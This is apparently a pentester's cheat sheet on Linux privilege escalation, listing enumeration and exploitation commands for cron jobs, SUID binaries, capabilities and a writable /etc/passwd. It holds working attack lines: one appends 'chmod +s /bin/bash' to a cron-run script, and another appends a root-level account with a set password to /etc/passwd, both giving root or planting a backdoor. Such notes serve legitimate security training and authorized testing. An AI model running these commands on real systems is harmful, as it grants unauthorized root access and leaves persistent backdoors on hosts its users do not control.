## Privilege Escalation

### Crontab
#### Enumeration  
```
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```
#### Exploitation  
```
echo "chmod +s /bin/bash" >> script.sh
```

### Services
#### Enumeration  
```
ps aux
```

### SUID
#### Enumeration  
```
find / -perm -u=s -type f 2>/dev/null
```
#### Exploitation
https://gtfobins.github.io/

### Capabiliti3es
#### Enumeration  
```
getcap -r / 2>/dev/null
```
#### Exploitation  
https://gtfobins.github.io/

### Passwd Writabble
#### Enumeration  
```
ls -la /etc/passwd
```
#### Exploitation  
```
echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### Enumeration Automated

#### Unix Privesc Check
```
./unix-privesc-check
```
https://pentestmonkey.net/tools/audit/unix-privesc-check

#### Linpeas
```
./linpeas.sh
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
